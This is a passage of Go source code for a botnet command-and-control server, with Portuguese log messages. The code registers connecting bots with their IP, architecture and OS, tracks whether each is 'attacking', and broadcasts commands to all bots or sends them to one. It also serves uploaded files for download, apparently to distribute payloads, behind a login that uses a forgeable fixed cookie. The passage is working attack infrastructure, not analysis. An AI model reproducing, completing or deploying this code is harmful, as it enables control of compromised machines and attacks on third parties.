var startTime = time.Now()

type UploadedFile struct {
	Name       string
	Size       int64
	UploadedAt time.Time
	ID         string
}

type Bot struct {
	ID          int
	Conn        net.Conn
	IP          string
	Arch        string
	OS          string
	LocalIP     string
	ConnectedAt time.Time
	Attacking   bool
	LastPing    time.Time
	mu          sync.Mutex
}

type BotManager struct {
	bots   map[int]*Bot
	nextID int
	mu     sync.RWMutex
}

var manager = &BotManager{bots: make(map[int]*Bot), nextID: 1}
var uploadedFiles []UploadedFile
var uploadMu sync.RWMutex

func randID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func loadExistingFiles() {
	entries, err := os.ReadDir(UPLOAD_DIR)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		name := e.Name()
		idx := strings.Index(name, "_")
		if idx < 1 {
			continue
		}
		fid := name[:idx]
		origName := name[idx+1:]
		info, err := e.Info()
		if err != nil {
			continue
		}
		uf := UploadedFile{
			Name:       origName,
			Size:       info.Size(),
			UploadedAt: info.ModTime(),
			ID:         fid,
		}
		uploadedFiles = append(uploadedFiles, uf)
	}
	if len(uploadedFiles) > 0 {
		fmt.Printf("[*] %d arquivo(s) carregado(s) da pasta uploads\n", len(uploadedFiles))
	}
}

func (m *BotManager) AddBot(conn net.Conn, arch, osinfo, localIP string) *Bot {
	m.mu.Lock()
	defer m.mu.Unlock()
	ip := conn.RemoteAddr().String()
	host, _, _ := net.SplitHostPort(ip)
	bot := &Bot{ID: m.nextID, Conn: conn, IP: host, Arch: arch, OS: osinfo, LocalIP: localIP, ConnectedAt: time.Now(), LastPing: time.Now()}
	m.bots[m.nextID] = bot
	m.nextID++
	fmt.Printf("[+] Bot #%d conectado: %s [%s] (%s)\n", bot.ID, host, arch, osinfo)
	return bot
}

func (m *BotManager) RemoveBot(id int) {
	m.mu.Lock()
	defer m.mu.Unlock()
	if bot, ok := m.bots[id]; ok {
		fmt.Printf("[-] Bot #%d desconectado: %s [%s]\n", bot.ID, bot.IP, bot.Arch)
		bot.Conn.Close()
		delete(m.bots, id)
	}
}

func (m *BotManager) GetBots() []*Bot {
	m.mu.RLock()
	defer m.mu.RUnlock()
	bots := make([]*Bot, 0, len(m.bots))
	for _, b := range m.bots {
		bots = append(bots, b)
	}
	return bots
}

func (m *BotManager) GetBotCount() int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return len(m.bots)
}

func (m *BotManager) SendToAll(cmd string) int {
	m.mu.RLock()
	defer m.mu.RUnlock()
	sent := 0
	for _, bot := range m.bots {
		bot.mu.Lock()
		_, err := fmt.Fprintf(bot.Conn, "%s\n", cmd)
		bot.mu.Unlock()
		if err == nil {
			sent++
		}
	}
	fmt.Printf("[*] Comando enviado para %d/%d bots: %s\n", sent, len(m.bots), cmd)
	return sent
}

func (m *BotManager) SendToBot(id int, cmd string) bool {
	m.mu.RLock()
	bot, ok := m.bots[id]
	m.mu.RUnlock()
	if !ok {
		return false
	}
	bot.mu.Lock()
	_, err := fmt.Fprintf(bot.Conn, "%s\n", cmd)
	bot.mu.Unlock()
	return err == nil
}

func handleBot(conn net.Conn) {
	if tc, ok := conn.(*net.TCPConn); ok {
		tc.SetKeepAlive(true)
		tc.SetKeepAlivePeriod(30 * time.Second)
	}
	scanner := bufio.NewScanner(conn)
	scanner.Buffer(make([]byte, 8192), 8192)
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	if !scanner.Scan() {
		conn.Close()
		return
	}
	hello := scanner.Text()
	parts := strings.SplitN(hello, "|", 4)
	if len(parts) < 2 || parts[0] != "HELLO" {
		conn.Close()
		return
	}
	arch := "unknown"
	osinfo := "unknown"
	localIP := "unknown"
	if len(parts) >= 2 {
		arch = parts[1]
	}
	if len(parts) >= 3 {
		osinfo = parts[2]
	}
	if len(parts) >= 4 {
		localIP = parts[3]
	}
	bot := manager.AddBot(conn, arch, osinfo, localIP)
	defer manager.RemoveBot(bot.ID)
	bot.mu.Lock()
	fmt.Fprintf(bot.Conn, "PING\n")
	bot.mu.Unlock()
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			<-ticker.C
			bot.mu.Lock()
			_, err := fmt.Fprintf(bot.Conn, "PING\n")
			bot.mu.Unlock()
			if err != nil {
				return
			}
		}
	}()
	for {
		conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		if !scanner.Scan() {
			break
		}
		line := scanner.Text()
		if strings.HasPrefix(line, "PONG|") {
			pp := strings.SplitN(line, "|", 3)
			if len(pp) >= 3 {
				bot.mu.Lock()
				bot.Attacking = pp[2] == "1"
				bot.LastPing = time.Now()
				bot.mu.Unlock()
			}
			continue
		}
		if strings.HasPrefix(line, "STATUS|") {
			st := strings.TrimPrefix(line, "STATUS|")
			bot.mu.Lock()
			bot.Attacking = (st == "attacking")
			bot.mu.Unlock()
			fmt.Printf("[*] Bot #%d (%s) status: %s\n", bot.ID, bot.IP, st)
			continue
		}
	}
}

func botListener() {
	ln, err := net.Listen("tcp", BOT_PORTA)
	if err != nil {
		fmt.Printf("[ERRO] Nao foi possivel abrir porta bot %s: %v\n", BOT_PORTA, err)
		return
	}
	fmt.Printf("[*] Bot Listener ativo na porta %s\n", BOT_PORTA)
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleBot(conn)
	}
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}
	r.ParseMultipartForm(100 << 20)
	file, header, err := r.FormFile("file")
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"error","message":"Erro no upload: %s"}`, err.Error())
		return
	}
	defer file.Close()
	fid := randID()
	safeName := filepath.Base(header.Filename)
	dstPath := filepath.Join(UPLOAD_DIR, fid+"_"+safeName)
	dst, err := os.Create(dstPath)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"status":"error","message":"Erro ao salvar arquivo"}`)
		return
	}
	defer dst.Close()
	written, _ := io.Copy(dst, file)
	uf := UploadedFile{Name: safeName, Size: written, UploadedAt: time.Now(), ID: fid}
	uploadMu.Lock()
	uploadedFiles = append(uploadedFiles, uf)
	uploadMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"status":"ok","id":"%s","name":"%s","size":%d}`, fid, safeName, written)
}

func deleteFileHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", 405)
		return
	}
	r.ParseForm()
	fid := r.FormValue("id")
	if fid == "" {
		http.Error(w, "Missing id", 400)
		return
	}
	uploadMu.Lock()
	idx := -1
	for i, f := range uploadedFiles {
		if f.ID == fid {
			idx = i
			break
		}
	}
	if idx >= 0 {
		fname := uploadedFiles[idx].Name
		os.Remove(filepath.Join(UPLOAD_DIR, fid+"_"+fname))
		uploadedFiles = append(uploadedFiles[:idx], uploadedFiles[idx+1:]...)
	}
	uploadMu.Unlock()
	w.Header().Set("Content-Type", "application/json")
	fmt.Fprintf(w, `{"status":"ok"}`)
}

func filesAPIHandler(w http.ResponseWriter, r *http.Request) {
	uploadMu.RLock()
	defer uploadMu.RUnlock()
	w.Header().Set("Content-Type", "application/json")
	host := r.Host
	proto := "http"
	fmt.Fprintf(w, `{"files":[`)
	for i, f := range uploadedFiles {
		url := fmt.Sprintf("%s://%s/dl/%s/%s", proto, host, f.ID, f.Name)
		ago := time.Since(f.UploadedAt).Seconds()
		fmt.Fprintf(w, `{"id":"%s","name":"%s","size":%d,"ago":%.0f,"url":"%s"}`, f.ID, f.Name, f.Size, ago, url)
		if i < len(uploadedFiles)-1 {
			fmt.Fprint(w, ",")
		}
	}
	fmt.Fprint(w, `]}`)
}

func downloadHandler(w http.ResponseWriter, r *http.Request) {
	path := strings.TrimPrefix(r.URL.Path, "/dl/")
	parts := strings.SplitN(path, "/", 2)
	if len(parts) < 2 {
		http.Error(w, "Not found", 404)
		return
	}
	fid := parts[0]
	fname := parts[1]
	fpath := filepath.Join(UPLOAD_DIR, fid+"_"+fname)
	if _, err := os.Stat(fpath); os.IsNotExist(err) {
		http.Error(w, "Not found", 404)
		return
	}
	w.Header().Set("Content-Disposition", "attachment; filename="+fname)
	w.Header().Set("Content-Type", "application/octet-stream")
	http.ServeFile(w, r, fpath)
}

func getCPUPercent() float64 {
	data, err := os.ReadFile("/proc/self/stat")
	if err != nil {
		return 0
	}
	fields := strings.Fields(string(data))
	if len(fields) < 15 {
		return 0
	}
	utime, _ := strconv.ParseFloat(fields[13], 64)
	stime, _ := strconv.ParseFloat(fields[14], 64)
	total := utime + stime
	clkTck := 100.0
	upSec := time.Since(startTime).Seconds()
	if upSec < 1 {
		return 0
	}
	pct := (total / clkTck / upSec) * 100.0
	if pct > 100 {
		pct = 100
	}
	return pct
}

func getMemInfo() (uint64, uint64) {
	var ms runtime.MemStats
	runtime.ReadMemStats(&ms)
	alloc := ms.Alloc
	var rusage syscall.Rusage
	syscall.Getrusage(syscall.RUSAGE_SELF, &rusage)
	rss := uint64(rusage.Maxrss) * 1024
	if rss < alloc {
		rss = ms.Sys
	}
	return rss, alloc
}

func authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		cookie, err := r.Cookie("auth_session")
		if err != nil || cookie.Value != "authenticated" {
			loginHandler(w, r)
			return
		}
		next(w, r)
	}
}

func loginHandler(w http.ResponseWriter, r *http.Request) {

	if r.Method == "POST" {
		r.ParseForm()
		if r.FormValue("user") == USUARIO && r.FormValue("pass") == SENHA {
			http.SetCookie(w, &http.Cookie{Name: "auth_session", Value: "authenticated", Path: "/", MaxAge: 3600})
			http.Redirect(w, r, "/dashboard", http.StatusFound)
			return
		}
		errorMsg = `<div class="error-alert">Credenciais invalidas</div>`
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	fmt.Fprintf(w, loginHTML(), errorMsg)
}
